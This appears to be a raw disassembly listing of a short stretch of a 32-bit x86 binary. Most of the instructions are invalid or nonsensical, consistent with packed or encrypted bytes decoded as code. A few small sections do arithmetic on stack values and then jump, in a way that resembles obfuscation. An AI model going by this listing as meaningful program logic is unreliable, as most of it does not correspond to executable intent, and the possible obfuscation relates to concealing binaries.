  40e90e:	and    cl,BYTE PTR [ecx]
  40e910:	add    eax,0x30e80560
  40e915:	(bad)  
  40e916:	retf   0x33df
  40e919:	loop   0x40e966
  40e91b:	addr16 loope 0x40e8bc
  40e91e:	mov    ebp,0x66a1927c
  40e923:	xchg   ebx,eax
  40e924:	jns    0x40e986
  40e926:	enter  0x4cc7,0x2d
  40e92a:	shl    DWORD PTR [ebx-0xc],cl
  40e92d:	jmp    0xf51c:0x3de74e31
  40e934:	fstp   TBYTE PTR [edi+0x44]
  40e937:	scas   al,BYTE PTR es:[edi]
  40e938:	mov    BYTE PTR [edi],cl
  40e93a:	jle    0x40e944
  40e93c:	pushf  
  40e93d:	cs cmc 
  40e93f:	xchg   DWORD PTR [eax+0x6bcca927],esi
  40e945:	dec    edx
  40e946:	cmc    
  40e947:	jae    0x40e8cc
  40e949:	inc    edi
  40e94a:	outs   dx,BYTE PTR ds:[esi]
  40e94b:	or     BYTE PTR [edi-0x44],dh
  40e94e:	jmp    0xa9e1f7d5
  40e953:	and    DWORD PTR [edi-0x59],esp
  40e956:	inc    ebx
  40e957:	leave  
  40e958:	enter  0x1bca,0x3e
  40e95c:	xchg   DWORD PTR [edx+ebp*2],ebp
  40e95f:	adc    edx,DWORD PTR [ecx+0x1]
  40e962:	cld    
  40e963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e964:	scas   eax,DWORD PTR es:[edi]
  40e965:	or     BYTE PTR [edi*4+0xa80fae4],0x4c
  40e96d:	mov    esi,0x55d951d7
  40e972:	out    0x5b,al
  40e974:	sbb    DWORD PTR [edi+eiz*8-0x26],edi
  40e978:	adc    eax,0x35db1fd
  40e97d:	mov    esi,DWORD PTR [ebp+0x8]
  40e980:	xchg   edi,eax
  40e981:	push   ss
  40e982:	adc    ebx,DWORD PTR [edx]
  40e984:	aaa    
  40e985:	fnsave [ebp-0x1d]
  40e988:	xchg   ebx,eax
  40e989:	inc    eax
  40e98a:	loop   0x40ea06
  40e98c:	jno    0x40e95c
  40e98e:	shr    edx,cl
  40e990:	into   
  40e991:	jns    0x40e95a
  40e993:	popf   
  40e994:	popa   
  40e995:	mov    ebp,0xc3b81f28
  40e99a:	dec    eax
  40e99b:	pop    esi
  40e99c:	add    BYTE PTR [ecx+0x4b],bh
  40e99f:	xchg   BYTE PTR [edx],bl
  40e9a1:	xchg   edx,eax
  40e9a2:	(bad)
  40e9a5:	lods   eax,DWORD PTR ds:[esi]
  40e9a6:	retf   
  40e9a7:	xchg   BYTE PTR [esi],ah
  40e9a9:	push   cs
  40e9aa:	inc    ecx
  40e9ab:	scas   al,BYTE PTR es:[edi]
  40e9ac:	push   cs
  40e9ad:	lds    esp,FWORD PTR [eax]
  40e9af:	pop    ecx
  40e9b0:	and    dl,BYTE PTR [esi+0x59d9ba18]
  40e9b6:	xlat   BYTE PTR ds:[ebx]
  40e9b7:	cmc    
  40e9b8:	mov    eax,ds:0xff521dac
  40e9bd:	cmc    
  40e9be:	or     BYTE PTR [edi-0x4],ah
  40e9c1:	sbb    ah,BYTE PTR [esi-0x35]
  40e9c4:	add    eax,0x8c4e9f17
  40e9c9:	xchg   edx,eax
  40e9ca:	jo     0x40ea46
  40e9cc:	jmp    0x40ea2d
  40e9ce:	int3   
  40e9cf:	ret    0xa4dd
  40e9d2:	dec    ebx
  40e9d3:	mov    DWORD PTR [ebx],eax
  40e9d5:	xor    eax,0x6a3f7b2
  40e9da:	or     esi,ebp
  40e9dc:	sbb    bh,BYTE PTR [edi+0x69]
  40e9df:	scas   eax,DWORD PTR es:[edi]
  40e9e0:	adc    al,0x46
  40e9e2:	sub    cl,0x39
  40e9e5:	leave  
  40e9e6:	xchg   BYTE PTR [eax],bl
  40e9e8:	mov    ebp,DWORD PTR [edi+0x59]
  40e9eb:	frstor [esp-0x50]
  40e9ef:	dec    edi
  40e9f0:	sbb    al,BYTE PTR [edi+0x5ad80eff]
  40e9f6:	lock stos DWORD PTR es:[edi],eax
  40e9f8:	add    eax,0x7b014a8c
  40e9fd:	pop    ebx
  40e9fe:	dec    esp
  40e9ff:	or     eax,0x86c27574
  40ea04:	xchg   ebx,eax
  40ea05:	in     al,dx
  40ea06:	out    dx,al
  40ea07:	mov    edx,0xbfb395fa
  40ea0c:	cwde   
  40ea0d:	dec    edi
  40ea0e:	xchg   ebp,eax
  40ea0f:	mov    dl,0x68
  40ea11:	sar    BYTE PTR [edx+ebp*1+0x6754673],0xd8
  40ea19:	das    
  40ea1a:	rol    DWORD PTR [eax],cl
  40ea1c:	adc    ebx,DWORD PTR ds:[edi]
  40ea1f:	mov    edi,0x585e3562
  40ea24:	sti    
  40ea25:	sahf   
  40ea26:	ds sbb edx,ebx
  40ea29:	and    DWORD PTR [ecx-0x2085ea24],ebx
  40ea2f:	add    cl,0x33
  40ea32:	inc    esp
  40ea33:	sub    DWORD PTR [ebx],ebx
  40ea35:	int    0x26
  40ea37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea38:	rol    BYTE PTR [ebp-0x11],cl
  40ea3b:	inc    esi
  40ea3c:	ror    BYTE PTR [edi+0x1738f45a],1
  40ea42:	mov    edx,0xa292b4b8
  40ea47:	scas   eax,DWORD PTR es:[edi]
  40ea48:	mov    ds:0xc0720e3a,eax
  40ea4d:	shr    esi,1
  40ea4f:	imul   edx,DWORD PTR [edi-0x3953e63e],0x7062f82f
  40ea59:	or     DWORD PTR [edi],edx
  40ea5b:	dec    esp
  40ea5c:	inc    esp
  40ea5d:	jns    0x40eac6
  40ea5f:	mov    esi,0x748b0ad2
  40ea64:	les    esp,FWORD PTR [edx]
  40ea66:	jecxz  0x40ea0d
  40ea68:	xchg   esi,eax
  40ea69:	in     al,dx
  40ea6a:	std    
  40ea6b:	pop    ebx
  40ea6c:	xchg   esi,eax
  40ea6d:	xchg   edx,eax
  40ea6e:	pop    es
  40ea6f:	xchg   esp,eax
  40ea70:	lock xor BYTE PTR [esp+eiz*8],dl
  40ea74:	pop    es
  40ea75:	loope  0x40eae1
  40ea77:	cld    
  40ea78:	dec    edi
  40ea79:	jmp    0x40ea14
  40ea7b:	out    dx,al
  40ea7c:	mov    ds:0xb69fa1a7,al
  40ea81:	mov    dh,0xc0
  40ea83:	sbb    DWORD PTR [eax-0x256d7d1b],eax
  40ea89:	fidiv  DWORD PTR [edx+0x78]
  40ea8c:	mov    edi,0x1d8b976
  40ea91:	in     eax,0xb2
  40ea93:	pop    ecx
  40ea94:	mov    edx,0x70456181
  40ea99:	hlt    
  40ea9a:	mov    WORD PTR [ecx+0x22e64630],?
  40eaa0:	(bad)  
  40eaa1:	shl    BYTE PTR [ebx],1
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x42251815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xe3aa14b9
  40eaf1:	mov    ds:0xb8fd6a43,eax
  40eaf6:	sbb    BYTE PTR [eax],bl
  40eaf8:	rcl    BYTE PTR [eax+ebx*1],cl
  40eafb:	sbb    BYTE PTR [esi-0x26d93bcb],dl
  40eb01:	std    
  40eb02:	add    dh,BYTE PTR [eax+edi*2-0x40]
  40eb06:	xor    eax,esp
  40eb08:	jne    0x40eae1
  40eb0a:	(bad)  
  40eb0b:	loop   0x40eac4
  40eb0d:	mov    WORD PTR [esi+0x25],gs
  40eb10:	lods   al,BYTE PTR ds:[esi]
  40eb11:	fs xor al,0x6d
  40eb14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb15:	adc    edx,DWORD PTR [edx+0x62]
  40eb18:	scas   al,BYTE PTR es:[edi]
  40eb19:	pop    edi
  40eb1a:	test   BYTE PTR [esi+ebp*2],al
  40eb1d:	daa    
  40eb1e:	ds mov esi,0x54671662
  40eb24:	jge    0x40eb4a
  40eb26:	mov    esi,0x546ab4ee
  40eb2b:	cmc    
  40eb2c:	xchg   ebx,eax
  40eb2d:	inc    esi
  40eb2e:	ficomp DWORD PTR [esi+0x1f]
  40eb31:	mov    cl,0xc7
  40eb33:	pop    ebp
  40eb34:	fwait
  40eb35:	lahf   
  40eb36:	add    bl,BYTE PTR [ebp-0x26c5e7de]
  40eb3c:	fwait
  40eb3d:	sbb    BYTE PTR [edx+0x50],bh
  40eb40:	adc    eax,0x2bf9f0b2
  40eb45:	cmp    ebp,edi
  40eb47:	sahf   
  40eb48:	fwait
  40eb49:	xor    ebp,DWORD PTR [esi]
  40eb4b:	jae    0x40ebb6
  40eb4d:	ret    0x1333
  40eb50:	in     ax,dx
  40eb52:	das    
  40eb53:	clc    
  40eb54:	add    dl,BYTE PTR [ebp+0x60]
  40eb57:	or     eax,0xecc65f47
  40eb5c:	and    BYTE PTR [edx],al
  40eb5e:	push   0xcc5973c0
  40eb63:	mov    dl,0xc4
  40eb65:	pop    ds
  40eb66:	xchg   ecx,eax
  40eb67:	jl     0x40eb5e
  40eb69:	rcl    BYTE PTR [ebp-0x307714e9],1
  40eb6f:	push   0x4aeacd4a
  40eb74:	ss inc edx
  40eb76:	push   ebp
  40eb77:	sti    
  40eb78:	fdiv   st,st(4)
  40eb7a:	mov    edx,0x35f93457
  40eb7f:	inc    edx
  40eb80:	(bad)  
  40eb81:	iret   
  40eb82:	cbw    
  40eb84:	xchg   esp,eax
  40eb85:	mov    esp,0xcc490a39
  40eb8a:	and    bh,BYTE PTR [ebx+0x3f]
  40eb8d:	rcr    dl,cl
  40eb8f:	cmp    al,0xb6
  40eb91:	pop    ds
  40eb92:	inc    edi
  40eb93:	repnz pop ecx
  40eb95:	stc    
  40eb96:	adc    edi,DWORD PTR [edi-0x40]
  40eb99:	inc    ecx
  40eb9a:	es popf 
  40eb9c:	dec    eax
  40eb9d:	mov    ch,BYTE PTR [edx]
  40eb9f:	pop    esp
  40eba0:	push   eax
  40eba1:	xor    DWORD PTR [esp+eiz*4-0x10],eax
  40eba5:	ds inc cx
  40eba8:	into   
  40eba9:	imul   esp,edi,0x91b4ba67
  40ebaf:	lods   al,BYTE PTR ds:[esi]
  40ebb0:	mov    cl,0xde
  40ebb2:	mov    edi,fs
  40ebb4:	push   esp
  40ebb5:	div    DWORD PTR [ebx]
  40ebb7:	or     eax,0xfdeba2e
  40ebbc:	cmp    eax,0xc28cfe3f
  40ebc1:	test   al,0x68
  40ebc3:	loope  0x40eb51
  40ebc5:	add    ch,ah
  40ebc7:	aad    0x78
  40ebc9:	xchg   edx,eax
  40ebca:	(bad)  
  40ebcc:	jo     0x40eb88
  40ebce:	mov    esp,0xcdb508ea
  40ebd3:	xchg   DWORD PTR [ecx-0x53],edx
  40ebd6:	ret    0xbc27
  40ebd9:	sbb    DWORD PTR [ebp-0x56],0x6d
  40ebdd:	jp     0x40ec4f
  40ebdf:	in     eax,0x11
  40ebe1:	jno    0x40ebf3
  40ebe3:	inc    eax
  40ebe4:	addr16 mov ch,0x33
  40ebe7:	pop    ds
  40ebe8:	pop    ebx
  40ebe9:	(bad)  
  40ebea:	xor    DWORD PTR [eax-0x40b1f394],0x28378157
  40ebf4:	movlps xmm5,QWORD PTR [esi+ecx*1-0x27d08ab7]
  40ebfc:	ret    
  40ebfd:	or     ah,bh
  40ebff:	adc    DWORD PTR [esi+0x40],edx
  40ec02:	sbb    ebp,DWORD PTR [ecx+esi*2+0x50]
  40ec06:	(bad)
  40ec0a:	inc    eax
  40ec0b:	mov    bl,0x8f
  40ec0d:	and    DWORD PTR [ebx],ebx
  40ec0f:	ins    BYTE PTR es:[edi],dx
  40ec10:	mov    BYTE PTR [ecx],ch
  40ec12:	dec    esp
  40ec13:	out    dx,al
  40ec14:	pusha  
  40ec15:	and    eax,0x2bd48f05
  40ec1a:	jle    0x40ec4b
  40ec1c:	sbb    BYTE PTR [edi-0x47],bh
  40ec1f:	out    dx,al
  40ec20:	mov    ch,0x2f
  40ec22:	shl    DWORD PTR [esi+ebp*8+0x50],cl
  40ec26:	popf   
  40ec27:	out    dx,eax
  40ec28:	xchg   ebx,eax
  40ec29:	and    DWORD PTR [esi+0x12bed2ef],esi
  40ec2f:	cld    
  40ec30:	inc    eax
  40ec31:	and    DWORD PTR [edi*2-0x3e69ff96],esi
  40ec38:	xchg   ecx,eax
  40ec39:	cmp    eax,0x602dcf3
  40ec3e:	xor    ecx,DWORD PTR [ecx+ecx*4+0x1f]
  40ec42:	adc    al,0x73
  40ec44:	dec    edx
  40ec45:	add    ebx,DWORD PTR [ecx+eiz*1+0x754e56e4]
  40ec4c:	xlat   BYTE PTR ds:[ebx]
  40ec4d:	push   0xffffffb7
  40ec4f:	test   DWORD PTR ds:0xe7418d4c,eax
  40ec55:	iret   
  40ec56:	adc    dh,BYTE PTR [ecx+0x4c]
  40ec59:	in     eax,0x2c
  40ec5b:	dec    edx
  40ec5c:	shl    DWORD PTR ds:0x6529aad8,1
  40ec62:	into   
  40ec63:	imul   eax,DWORD PTR [edi+0x4331e5db],0xc0c637ed
  40ec6d:	mov    bl,0x44
  40ec6f:	pop    ds
  40ec70:	pop    edx
  40ec71:	push   cs
  40ec72:	jmp    0x19e4:0x92d5fd4a
  40ec79:	mov    al,0x1a
  40ec7b:	inc    ebp
  40ec7c:	jg     0x40ec60
  40ec7e:	jbe    0x40ec02
  40ec80:	sti    
  40ec81:	notrack call DWORD PTR ds:0xe4da5b6e
  40ec88:	push   es
  40ec89:	push   es
  40ec8a:	pushf  
  40ec8b:	imul   edx,DWORD PTR [ebp-0x4d],0x60
  40ec8f:	pop    ebp
  40ec90:	jmp    ebp
  40ec92:	xor    DWORD PTR [edi-0x4555f0f6],eax
  40ec98:	or     ch,0x6d
  40ec9b:	push   ebp
  40ec9c:	inc    ecx
  40ec9d:	(bad)  
  40ec9e:	leave  
  40ec9f:	or     al,0x33
  40eca1:	push   esi
  40eca2:	adc    ch,0x17
  40eca5:	xchg   edi,eax
  40eca6:	pop    es
  40eca7:	pusha  
  40eca8:	or     cl,dh
  40ecaa:	mov    WORD PTR [esi-0x5f3baaca],ds
  40ecb0:	mov    ds:0x8c2029a9,al
  40ecb5:	addr16 pop esp
  40ecb7:	cmp    al,0x38
  40ecb9:	stos   DWORD PTR es:[edi],eax
  40ecba:	loop   0x40eca9
  40ecbc:	inc    esp
  40ecbd:	fldenv [eax-0x3a432fdf]
  40ecc3:	shl    BYTE PTR [edx+0x12],0x3a
  40ecc7:	mov    DWORD PTR [eax],ecx
  40ecc9:	pop    edi
  40ecca:	mov    ecx,0x2dc431b5
  40eccf:	jo     0x40ecf6
  40ecd1:	cmp    eax,DWORD PTR [edi]
  40ecd3:	and    BYTE PTR [ebx+0x16],ch
  40ecd6:	jecxz  0x40ed13
  40ecd8:	int3   
  40ecd9:	xor    esp,eax
  40ecdb:	xor    dh,bl
  40ecdd:	gs mov esp,0x6372c89d
  40ece3:	stos   BYTE PTR es:[edi],al
  40ece4:	leave  
  40ece5:	push   esp
  40ece6:	jmp    0x40ed03
  40ece8:	add    bl,0xaa
  40eceb:	dec    esi
  40ecec:	loopne 0x40ecc0
  40ecee:	xchg   ecx,eax
  40ecef:	or     ch,ch
  40ecf1:	jne    0x40ec7d
  40ecf3:	and    eax,0x42696e8f
  40ecf8:	adc    al,0xe2
  40ecfa:	mov    ch,0x8d
  40ecfc:	inc    ebp
  40ecfd:	div    DWORD PTR [ebx-0x5b]
  40ed00:	jns    0x40ed2e
  40ed02:	jge    0x40ed79
  40ed04:	cdq    
  40ed05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed06:	jge    0x40ecc1
  40ed08:	and    esp,DWORD PTR [ecx+0x15]
  40ed0b:	jno    0x40ecc0
  40ed0d:	(bad)  
  40ed0f:	data16 loop 0x40ed6e
  40ed12:	push   edx
  40ed13:	xchg   ecx,eax
  40ed14:	(bad)  
  40ed15:	popa   
  40ed16:	push   esi
  40ed17:	inc    ebp
  40ed18:	push   ebp
  40ed19:	aad    0x35
  40ed1b:	in     eax,0x20
  40ed1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed1f:	xor    cl,cl
  40ed21:	jbe    0x40ed54
  40ed23:	and    esi,edx
  40ed25:	add    edi,DWORD PTR [esi]
  40ed27:	leave  
  40ed28:	js     0x40ed67
  40ed2a:	inc    edi
  40ed2b:	sub    cl,BYTE PTR [ebx+eax*1+0xf]
  40ed2f:	(bad)  
  40ed30:	adc    al,0x6d
  40ed32:	inc    ebp
  40ed33:	ret    
  40ed34:	dec    ecx
  40ed35:	out    dx,al
  40ed36:	in     al,dx
  40ed37:	sub    al,0xa9
  40ed39:	ret    0x3ff0
  40ed3c:	enter  0x39c9,0x9f
  40ed40:	mov    bh,0x6
  40ed42:	jne    0x40edba
  40ed44:	rol    BYTE PTR [ebx-0x26afb338],1
  40ed4a:	dec    edx
  40ed4b:	std    
  40ed4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed4d:	ds inc ebx
  40ed4f:	sub    eax,0x46b7420a
  40ed54:	lods   al,BYTE PTR ds:[esi]
  40ed55:	adc    al,0xdf
  40ed57:	lea    bx,[edx+0x68]
  40ed5b:	or     BYTE PTR [esi-0x3cb089f1],0x28
  40ed62:	call   0x8090e1c
  40ed67:	fstp   QWORD PTR [edx+0x1fedef7b]
  40ed6d:	outs   dx,DWORD PTR ds:[esi]
  40ed6e:	fst    QWORD PTR [ebp-0x4e]
  40ed71:	push   esi
  40ed72:	adc    eax,0xd479a5d1
  40ed77:	and    BYTE PTR [ecx+0x36],al
  40ed7a:	sahf   
  40ed7b:	bound  eax,QWORD PTR [ecx+0x75]
  40ed7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed7f:	xchg   dl,ah
  40ed81:	lea    edx,[esi-0x7d3fa12e]
  40ed87:	imul   edi,DWORD PTR [edx-0x7b744835],0x7b
  40ed8e:	inc    esi
  40ed8f:	fidivr WORD PTR [ebx]
  40ed91:	pushf  
  40ed92:	daa    
  40ed93:	xchg   BYTE PTR [eax],al
  40ed95:	jecxz  0x40ed73
  40ed97:	outs   dx,DWORD PTR ds:[esi]
  40ed98:	mov    ebx,0x16ed2f16
  40ed9d:	jae    0x40ed23
  40ed9f:	in     eax,0x0
  40eda1:	xchg   BYTE PTR [ebx],cl
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x4daa1270]
  40edd3:	out    0x18,eax
  40edd5:	stos   BYTE PTR es:[edi],al
  40edd6:	mov    bh,0xb2
  40edd8:	sbb    BYTE PTR [eax],bl
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    BYTE PTR [ecx-0x9d6f3de],dh
  40ede3:	mov    DWORD PTR [edx+ebx*2],ebx
  40ede6:	pop    eax
  40ede7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ede8:	adc    DWORD PTR [ebp+0x11a7d09a],ebx
  40edee:	repnz mov cl,0x7e
  40edf1:	mov    bh,0xa8
  40edf3:	push   ds
  40edf4:	push   0xf4822f23
  40edf9:	pop    ecx
  40edfa:	int    0x75
  40edfc:	(bad)  
  40edfd:	idiv   DWORD PTR [ebx+0x6a0f1474]
  40ee03:	dec    ebx
  40ee04:	pop    edx
  40ee05:	mov    ch,BYTE PTR [ebx+edi*1]
  40ee08:	icebp  
  40ee09:	or     al,0xbe
  40ee0b:	(bad)  
  40ee0c:	and    DWORD PTR [ebx-0x17],ebp
  40ee0f:	shl    BYTE PTR [ecx+0x56a2df65],1
  40ee15:	push   ebp
  40ee16:	mov    esp,0x8d8f35e3
  40ee1b:	and    eax,0x357f85f8
  40ee20:	cmp    DWORD PTR [edx+0x255ec315],ebp
  40ee26:	push   esi
  40ee27:	or     eax,0x8a82a87c
  40ee2c:	(bad)  
  40ee2d:	out    0xb5,eax
  40ee2f:	mov    al,ds:0x21642238
  40ee34:	xchg   edx,eax
  40ee35:	stos   BYTE PTR es:[edi],al
  40ee36:	cs loopne 0x40edc3
  40ee39:	fistp  QWORD PTR [esi-0x54567795]
  40ee3f:	adc    al,0x8
  40ee41:	jae    0x40eec0
  40ee43:	xor    al,0x97
  40ee45:	cdq    
  40ee46:	cmc    
  40ee47:	in     eax,dx
  40ee48:	fdivr  DWORD PTR [ebx-0x32]
  40ee4b:	rol    BYTE PTR [edi-0x7c],1
  40ee4e:	ficomp WORD PTR [esi-0x2a]
  40ee51:	clc    
  40ee52:	(bad)  
  40ee53:	mov    ebp,0x43eaba85
  40ee58:	ja     0x40eea1
  40ee5a:	sub    eax,0xfecdad0e
  40ee5f:	scas   eax,DWORD PTR es:[edi]
  40ee60:	fld    QWORD PTR [edi-0x3bddf8e9]
  40ee66:	push   esi
  40ee67:	je     0x40eea8
  40ee69:	sub    eax,0xd90687df
  40ee6e:	dec    ebx
  40ee6f:	clc    
  40ee70:	or     al,0x6c
  40ee72:	arpl   WORD PTR es:[ecx],cx
  40ee75:	repnz push ss
  40ee77:	(bad)  
  40ee78:	or     eax,0x5973b2a4
  40ee7d:	jmp    ecx
  40ee7f:	in     eax,0x99
  40ee81:	sbb    esp,eax
  40ee83:	mov    dh,0xe8
  40ee85:	mul    dh
  40ee87:	lahf   
  40ee88:	mov    edx,esp
  40ee8a:	and    BYTE PTR [edx],al
  40ee8c:	cmp    DWORD PTR [ebx],eax
  40ee8e:	mov    edx,0x1785a6d6
  40ee93:	mov    ah,0x2d
  40ee95:	mov    bl,0x6b
  40ee97:	or     al,0x74
  40ee99:	xchg   esp,eax
  40ee9a:	sub    bh,dl
  40ee9c:	inc    edi
  40ee9d:	rcr    ecx,1
  40ee9f:	stc    
  40eea0:	gs inc esp
  40eea2:	sbb    eax,0xc16471e7
  40eea7:	and    DWORD PTR [edi+eax*2-0x62],ecx
  40eeab:	jge    0x40eefd
  40eead:	sub    DWORD PTR [esi-0x69],esi
  40eeb0:	xchg   DWORD PTR [ebx],edx
  40eeb2:	mov    ebp,0x654e89b4
  40eeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeb8:	test   al,0x6c
  40eeba:	cmp    eax,0x9d94a031
  40eebf:	sbb    bh,cl
  40eec1:	mov    esi,0x6e1f6a99
  40eec6:	shl    dl,0x46
  40eec9:	rcl    edx,0xbb
  40eecc:	sar    ah,1
  40eece:	icebp  
  40eecf:	and    eax,edx
  40eed1:	ins    BYTE PTR es:[edi],dx
  40eed2:	add    al,0x51
  40eed4:	out    0xe5,al
  40eed6:	push   es
  40eed7:	inc    edx
  40eed8:	sahf   
  40eed9:	pushf  
  40eeda:	push   esp
  40eedb:	or     DWORD PTR [edi+0x18],0x46
  40eedf:	ins    BYTE PTR es:[edi],dx
  40eee0:	test   al,0x8f
  40eee2:	stos   BYTE PTR es:[edi],al
  40eee3:	(bad)  
  40eee5:	mov    dh,0x62
  40eee7:	xchg   ebx,eax
  40eee8:	or     al,0xb2
  40eeea:	jle    0x40ef4b
  40eeec:	push   edx
  40eeed:	pop    ss
  40eeee:	pop    es
  40eeef:	sub    DWORD PTR [eax+0x47284308],edi
  40eef5:	sub    BYTE PTR [edx+0xda23b59],0x89
  40eefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eefd:	push   ebx
  40eefe:	sub    DWORD PTR ds:0xc092c486,esi
  40ef04:	lods   eax,DWORD PTR ds:[esi]
  40ef05:	cmp    ecx,0x6a
  40ef08:	shr    DWORD PTR [ebx],cl
  40ef0a:	loopne 0x40ee93
  40ef0c:	mov    dl,BYTE PTR [edx-0x495d724d]
  40ef12:	lgs    ecx,FWORD PTR [eax]
  40ef15:	pop    ebx
  40ef16:	sub    eax,0xed5e3cfc
  40ef1b:	stos   BYTE PTR es:[edi],al
  40ef1c:	adc    BYTE PTR [edi-0x68],dh
  40ef1f:	inc    eax
  40ef20:	in     al,dx
  40ef21:	xor    BYTE PTR [edi+0x1af8445],al
  40ef27:	gs pop ecx
  40ef29:	mov    ch,0x51
  40ef2b:	test   ecx,ebx
  40ef2d:	dec    edx
  40ef2e:	sub    al,0xd6
  40ef30:	sbb    al,0x6c
  40ef32:	sti    
  40ef33:	aad    0xad
  40ef35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef36:	pop    edi
  40ef37:	js     0x40ef92
  40ef39:	push   esp
  40ef3a:	sub    eax,0xf093662a
  40ef3f:	in     eax,0xf1
  40ef41:	(bad)  
  40ef42:	js     0x40ef79
  40ef44:	loopne 0x40ef76
  40ef46:	pop    eax
  40ef47:	jmp    0x40ef95
  40ef49:	or     eax,0x7917ff68
  40ef4e:	popa   
  40ef4f:	dec    edx
  40ef50:	loope  0x40ef13
  40ef52:	into   
  40ef53:	lock jnp 0x40ef9f
  40ef56:	and    esi,ecx
  40ef58:	stos   BYTE PTR es:[edi],al
  40ef59:	push   es
  40ef5a:	int3   
  40ef5b:	lahf   
  40ef5c:	imul   bl
  40ef5e:	mov    bl,0xe6
  40ef60:	gs xchg ebx,eax
  40ef62:	mov    edx,0x41dc9bac
  40ef67:	std    
  40ef68:	(bad)  
  40ef69:	rcr    BYTE PTR [ebp-0x24],1
  40ef6c:	mov    ch,0x91
  40ef6e:	inc    ecx
  40ef6f:	jmp    0x3033:0x1ac28
  40ef76:	inc    BYTE PTR [ebx+0x6e4a2aba]
  40ef7c:	cmc    
  40ef7d:	mov    edx,0x183e0ca0
  40ef82:	fcom   DWORD PTR [edi]
  40ef84:	sub    al,0xb6
  40ef86:	xlat   BYTE PTR ds:[ebx]
  40ef87:	cmp    ebp,edx
  40ef89:	mov    cl,0x92
  40ef8b:	jb     0x40ef84
  40ef8d:	rol    BYTE PTR [edi],cl
  40ef8f:	and    BYTE PTR [edi-0x572eb127],bh
  40ef95:	fimul  WORD PTR ds:0x3fcf102
  40ef9b:	inc    esp
  40ef9c:	cdq    
  40ef9d:	imul   esp,DWORD PTR [ebx-0xa264c58],0x3a
  40efa4:	cmp    DWORD PTR [ebx+ebp*1+0x449c49e8],eax
  40efab:	mov    esi,0x918b4446
  40efb0:	sbb    ah,BYTE PTR [ebx]
  40efb2:	sar    DWORD PTR [esi+0x8],cl
  40efb5:	mov    dl,BYTE PTR [edi+0x7ce05cb2]
  40efbb:	pop    edi
  40efbc:	dec    esp
  40efbd:	das    
  40efbe:	push   0xb17e71ca
  40efc3:	cmp    al,0x98
  40efc5:	out    dx,eax
  40efc6:	fsub   QWORD PTR [esi]
  40efc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc9:	add    al,0x45
  40efcb:	cmp    DWORD PTR [edx-0x74bfe895],0xbe632139
  40efd5:	mov    eax,ds:0x290ce43d
  40efda:	add    BYTE PTR [ebx+ebp*1-0x45e234b9],0x46
  40efe2:	shl    DWORD PTR [edx+0x607c0d7a],0xcf
  40efe9:	fstp   QWORD PTR [ecx]
  40efeb:	or     eax,0x61ead422
  40eff0:	retf   
  40eff1:	inc    ebp
  40eff2:	mov    dh,0xa3
  40eff4:	add    ch,BYTE PTR [ebx+0x3830ba57]
  40effa:	pop    ebx
  40effb:	push   esi
  40effc:	mov    eax,ds:0x18f06ad4
  40f001:	cli    
  40f002:	aad    0x8e
  40f004:	lods   al,BYTE PTR ds:[esi]
  40f005:	cmp    DWORD PTR [ebp+0x21],edi
  40f008:	(bad)  
  40f009:	mov    dh,0x2
  40f00b:	leave  
  40f00c:	adc    DWORD PTR [ecx+esi*4+0x58],ebx
  40f010:	push   es
  40f011:	adc    cl,BYTE PTR [ebx+0x63d3b073]
  40f017:	fisub  WORD PTR [ebx+0x30a88d42]
  40f01d:	jp     0x40f07b
  40f01f:	push   cs
  40f020:	mov    es,WORD PTR cs:[edx-0x74]
  40f024:	mov    ebx,0xd71e041e
  40f029:	repz push es
  40f02b:	dec    ecx
  40f02c:	and    al,0x87
  40f02e:	and    ecx,edx
  40f030:	xchg   edx,eax
  40f031:	jne    0x40f05c
  40f033:	mov    al,0x6e
  40f035:	imul   edx,DWORD PTR ss:[edx],0x1ce6326b
  40f03c:	loope  0x40f00a
  40f03e:	pop    ebx
  40f03f:	and    al,0xb
  40f041:	ffreep st(1)
  40f043:	and    ebx,DWORD PTR [ebp-0x789cabdd]
  40f049:	scas   al,BYTE PTR es:[edi]
  40f04a:	pop    ebp
  40f04b:	jmp    0x66d53e68
  40f050:	fdivp  st(0),st
  40f052:	dec    ecx
  40f053:	aas    
  40f054:	xchg   bl,cl
  40f056:	xchg   ebx,eax
  40f057:	data16 xchg BYTE PTR [esi-0xa5eb424],cl
